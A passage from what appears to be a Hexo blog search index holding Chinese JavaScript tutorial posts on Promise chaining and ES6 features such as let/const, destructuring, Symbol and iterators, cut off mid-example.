class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Promise的链式调用"><a href="#Promise的链式调用" class="headerlink" title="Promise的链式调用"></a>Promise的链式调用</h1><p>我们可以用 <code>promise.then()</code> 这方法将进一步的操作与一个变为已敲定状态的 promise 关联起来。这些方法还会返回一个新生成的 promise 对象，这个对象可以被非强制性的用来做链式调用，就像这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 链式调用</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        resolve(<span class="string">&#x27;用户数据&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">erro</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 使用promise</span></span><br><span class="line"><span class="keyword">let</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function">(<span class="params">resolve, reject</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;你&#x27;</span></span><br><span class="line">    resolve(data)</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line">p3.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> data2 =  <span class="string">&#x27;是&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> array = <span class="built_in">Array</span>.from(value+data2)</span><br><span class="line">        resolve(array)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="function"><span class="params">erro</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> data2 =  <span class="string">&#x27;笨&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> array = <span class="built_in">Array</span>.from(value)</span><br><span class="line">        array.push(data2)</span><br><span class="line">        resolve(array)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="function"><span class="params">erro</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> data2 =  <span class="string">&#x27;蛋&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> array = <span class="built_in">Array</span>.from(value)</span><br><span class="line">        array.push(data2)</span><br><span class="line">        <span class="built_in">console</span>.log(array);</span><br><span class="line">        <span class="comment">// resolve(array)</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="function"><span class="params">erro</span> =&gt;</span> &#123;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4) [&#x27;你&#x27;, &#x27;是&#x27;, &#x27;笨&#x27;, &#x27;蛋&#x27;]</span></span><br></pre></td></tr></table></figure><h1 id="catch"><a href="#catch" class="headerlink" title="catch"></a>catch</h1><p>表示捕获回调失败的状态</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function">(<span class="params">resolve, reject</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;你&#x27;</span></span><br><span class="line">    resolve(data)</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line">p3.catch(<span class="function"><span class="params">erro</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.warn(erro)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6语法</title>
      <link href="/2022/03/18/ES6/"/>
      <url>/2022/03/18/ES6/</url>
      
        <content type="html"><![CDATA[<center><h1>ES6语法</h1></center><h1 id="什么是ECMAScript"><a href="#什么是ECMAScript" class="headerlink" title="什么是ECMAScript"></a>什么是ECMAScript</h1><p>ECMAScript是浏览器脚本语言的规范，而我们熟知的js语言，如JavaScript则是规范的具体实现。es6就好比Java的jdk。</p><h1 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h1><h3 id="let声明变量"><a href="#let声明变量" class="headerlink" title="let声明变量"></a>let声明变量</h3><p>var声明的变量往往会越域；let声明的变量有严格局部作用域</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(a)  <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">console</span>.log(b) <span class="comment">// Uncaught ReferenceError: b is not defined</span></span><br></pre></td></tr></table></figure><p>var 可以声明多次 let只能声明一次</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> m = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(m) <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">console</span>.log(n) <span class="comment">//Uncaught SyntaxError: Identifier &#x27;n&#x27; has already been declared</span></span><br></pre></td></tr></table></figure><p>var会变量提升 let不存在变量提升</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>; <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(y);</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">12</span>; <span class="comment">// Uncaught ReferenceError: Cannot access &#x27;y&#x27; before initialization</span></span><br></pre></td></tr></table></figure><h3 id="const声明变量"><a href="#const声明变量" class="headerlink" title="const声明变量"></a>const声明变量</h3><p>相当于声明了一个常量 声明之后不允许改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">//1</span></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// Uncaught TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure><p>一旦声明必须初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a;</span><br><span class="line">a = <span class="number">1</span>; </span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">//Uncaught SyntaxError: Missing initializer in const declaration</span></span><br></pre></td></tr></table></figure><h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><h2 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a>数组解构</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line"><span class="keyword">let</span> [q, w, e] = array</span><br><span class="line"><span class="built_in">console</span>.log(q);</span><br><span class="line"><span class="built_in">console</span>.log(w);</span><br><span class="line"><span class="built_in">console</span>.log(e);</span><br></pre></td></tr></table></figure><h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> object = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">jineng</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我在放大招&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;jineng, age&#125; = object</span><br><span class="line">jineng()</span><br><span class="line"><span class="built_in">console</span>.log(age);</span><br></pre></td></tr></table></figure><h1 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h1><p>内容中可以直接出现换行符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;span&gt;hello \n  world&lt;/span&gt;`</span></span><br><span class="line"><span class="built_in">console</span>.log(str) </span><br></pre></td></tr></table></figure><p>字符串插入变量和表达式。变量写在${}中，${}中可以放入js表达式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`我叫<span class="subst">$&#123;name&#125;</span>`</span>); </span><br></pre></td></tr></table></figure><h1 id="函数优化"><a href="#函数优化" class="headerlink" title="函数优化"></a>函数优化</h1><p>直接给参数写上默认值，没传就会自动使用默认值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(add(<span class="number">10</span>)) <span class="comment">//11</span></span><br></pre></td></tr></table></figure><h1 id="对象优化"><a href="#对象优化" class="headerlink" title="对象优化"></a>对象优化</h1><p>es6给Object扩展了许多新的方法，如</p><ul><li>key(obj)：获取对象的所有key形成的数组</li><li>value(obj):获取对象的所有value形成的数组</li><li>entries(obj):获取对象所有的key和value形成的二维数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;java&quot;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">23</span>,</span><br><span class="line">      <span class="attr">language</span>: [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;js&quot;</span>, <span class="string">&quot;css&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(person)) <span class="comment">//[&quot;name&quot;,&quot;age&quot;,&quot;language&quot;]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.values(person)) <span class="comment">// [&quot;qiyue&quot;,23,Array(3)]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.entries(person)) <span class="comment">//[Array(2),Array(2),Array(2)]</span></span><br></pre></td></tr></table></figure><h2 id="Object-is"><a href="#Object-is" class="headerlink" title="Object.is"></a>Object.is</h2><p>判断两个值是否完全相等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.is(<span class="number">100</span>, <span class="number">100</span>)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="SetPrototypeOf-amp-amp-getPrototypeOf"><a href="#SetPrototypeOf-amp-amp-getPrototypeOf" class="headerlink" title="SetPrototypeOf&amp;&amp;getPrototypeOf"></a>SetPrototypeOf&amp;&amp;getPrototypeOf</h2><p>设置和获取原型对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">    <span class="attr">name</span>: [<span class="string">&#x27;小xx&#x27;</span>, <span class="string">&#x27;大xx&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(school, student)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(school));</span><br><span class="line"><span class="built_in">console</span>.log(school);</span><br></pre></td></tr></table></figure><h2 id="assign"><a href="#assign" class="headerlink" title="assign"></a>assign</h2><p>Object.assign方法的第一个参数是目标对象，后面的参数都是源对象；将源对象的属性赋值到目标对象中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;</span><br><span class="line">   <span class="keyword">const</span> source1 = &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;</span><br><span class="line">   <span class="keyword">const</span> source2 = &#123; <span class="attr">c</span>: <span class="number">3</span> &#125;</span><br><span class="line">   <span class="built_in">Object</span>.assign(target, source1, source2);</span><br><span class="line">   <span class="built_in">console</span>.log(target) <span class="comment">//&#123;a: 1, b: 2, c: 3&#125;</span></span><br></pre></td></tr></table></figure><h2 id="声明对象简写"><a href="#声明对象简写" class="headerlink" title="声明对象简写"></a>声明对象简写</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person3 = &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;java&quot;</span>,</span><br><span class="line">      <span class="comment">//以前</span></span><br><span class="line">      <span class="attr">eat</span>: <span class="function"><span class="keyword">function</span> (<span class="params">food</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&quot;在吃&quot;</span> + food);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">//箭头函数中this不能使用，用对象.属性</span></span><br><span class="line">      <span class="attr">eat2</span>: <span class="function"><span class="params">food</span> =&gt;</span> <span class="built_in">console</span>.log(person3.name + <span class="string">&quot;在吃&quot;</span> + food),</span><br><span class="line">      <span class="function"><span class="title">eat3</span>(<span class="params">food</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&quot;在吃&quot;</span> + food)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    person3.eat(<span class="string">&quot;苹果&quot;</span>) <span class="comment">//qiyue在吃苹果</span></span><br><span class="line">    person3.eat2(<span class="string">&quot;香蕉&quot;</span>) <span class="comment">// qiyue在吃香蕉</span></span><br><span class="line">    person3.eat3(<span class="string">&quot;西瓜&quot;</span>) <span class="comment">//qiyue在吃西瓜</span></span><br></pre></td></tr></table></figure><h2 id="对象的扩展运算符"><a href="#对象的扩展运算符" class="headerlink" title="对象的扩展运算符"></a>对象的扩展运算符</h2><p>扩展运算符（…)用于取出参数对象所有可遍历属性然后拷贝到当前对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拷贝对象（深拷贝）</span></span><br><span class="line">    <span class="keyword">let</span> p1 = &#123; <span class="attr">name</span>: <span class="string">&quot;java&quot;</span>, <span class="attr">age</span>: <span class="number">23</span> &#125;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123; ...p1 &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(obj)<span class="comment">//&#123;name: &quot;qiyue&quot;, age: 23&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并对象</span></span><br><span class="line">    <span class="keyword">let</span> age1 = &#123; <span class="attr">age</span>: <span class="number">24</span> &#125;</span><br><span class="line">    <span class="keyword">let</span> name1 = &#123; <span class="attr">name</span>: <span class="string">&quot;java&quot;</span> &#125;</span><br><span class="line">    <span class="keyword">let</span> p2 = &#123;&#125;</span><br><span class="line">    p2 = &#123; ...age1, ...name1 &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(p2) <span class="comment">//&#123;age: 24, name: &quot;qiyue&quot;&#125;</span></span><br><span class="line">    <span class="comment">//如果p2中原本有name,age属性会被覆盖</span></span><br></pre></td></tr></table></figure><h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      c = a + b</span><br><span class="line">      <span class="keyword">return</span> c</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>, <span class="number">3</span>)) <span class="comment">// 5</span></span><br><span class="line"><span class="comment">//箭头函数</span></span><br><span class="line"><span class="keyword">var</span> sum2 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b;</span><br><span class="line"><span class="built_in">console</span>.log(sum2(<span class="number">2</span>, <span class="number">4</span>)) <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><h2 id="箭头函数结合解构表达式"><a href="#箭头函数结合解构表达式" class="headerlink" title="箭头函数结合解构表达式"></a>箭头函数结合解构表达式</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以前</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">person</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;hello&quot;</span> + person.name)</span><br><span class="line">    &#125;</span><br><span class="line">    hello(person); <span class="comment">//helloqiyue</span></span><br><span class="line">    <span class="comment">//箭头函数</span></span><br><span class="line">    <span class="keyword">let</span> hello2 = <span class="function"><span class="params">params</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;hello&quot;</span> + person.name)</span><br><span class="line">    hello2(person) <span class="comment">//helloqiyue</span></span><br><span class="line">    <span class="comment">//箭头函数加解构表达式</span></span><br><span class="line">    <span class="keyword">var</span> hello3 = <span class="function">(<span class="params">&#123; name &#125;</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;hello&quot;</span> + name)</span><br><span class="line">    hello3(person) <span class="comment">//helloqiyue</span></span><br></pre></td></tr></table></figure><h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><p>它时原始数据类型, 表示独一无二的值，它是javaScript语言中的第七数据类型， 是类似于字符串的数据类型</p><p>特点</p><ul><li>Symbol的值是唯一的，用来解决命名冲突问题</li><li>Symbol值不能与其他数据进行预算</li><li>Symbol 定义的对象属性不能使用for…in 循环便利，但是可以使用Reflect.ownKeys来获取对象的所有键名。</li></ul><p>创建Symbol</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Symbol</span></span><br><span class="line"><span class="keyword">let</span>  s = <span class="built_in">Symbol</span>()</span><br><span class="line"><span class="built_in">console</span>.log(s, <span class="keyword">typeof</span> s);  <span class="comment">//Symbol() &#x27;symbol&#x27;</span></span><br></pre></td></tr></table></figure><p>进行比较</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span>  s = <span class="built_in">Symbol</span>(<span class="string">&#x27;张三&#x27;</span>) <span class="comment">// 只是一块标记</span></span><br><span class="line"><span class="keyword">let</span>  s2 = <span class="built_in">Symbol</span>(<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(s===s2); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s3 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> s4 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(s3 == s4); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><blockquote><p>不能与其他数据进行运算</p></blockquote><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>迭代器是一种接口, 为各种不同数据结构提供统一的访问机制。任何数据接口只要部署了iterator接口就可以完成便利操作</p><p>原生具备了iterator接口的数据</p><ul><li>Array</li><li>Argumments</li><li>Set</li><li>Map</li><li>String</li><li>TypeArray</li><li>NodeList</li></ul><p>运行方式</p><p>创建一个指针对象，指向当前数据结构的初始位置</p><p>第一次调用对象nex方法，指针自动指向数据结构的第一个成员，接下来不断调用next方法指针之一往后移动，直到指向最后一个成员</p><p>不适用迭代器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迭代器</span></span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>]</span><br><span class="line">    <span class="comment">// 使用for ..of 循环</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> arr) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(v);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用迭代器</p><p>当done返回true时表示指针指向了最后一个元素 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const iterator = arr[Symbol.iterator]()</span><br><span class="line">    while(iterator.next().done != false)&#123;</span><br><span class="line">        console.log(iterator.next());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>自定义迭代器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  自定义迭代器</span></span><br><span class="line"><span class="keyword">const</span> classes = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;天天向上&#x27;</span>,</span><br><span class="line">    <span class="attr">students</span>: [<span class="string">&#x27;g1&#x27;</span>,<span class="string">&#x27;,g2&#x27;</span>,<span class="string">&#x27;g3&#x27;</span>,<span class="string">&#x27;g4&#x27;</span>],</span><br><span class="line">    [<span class="built_in">Symbol</span>.iterator]()&#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> _this = <span class="built_in">this</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">next</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(index &lt; _this.students.length)&#123;</span><br><span class="line">                    <span class="keyword">const</span> result =  &#123; <span class="attr">value</span>: _this.students[index], <span class="attr">done</span>: <span class="literal">false</span>&#125;</span><br><span class="line">                    index ++;</span><br><span class="line">                    <span class="keyword">return</span> result    </span><br><span class="line">                &#125;   </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123; <span 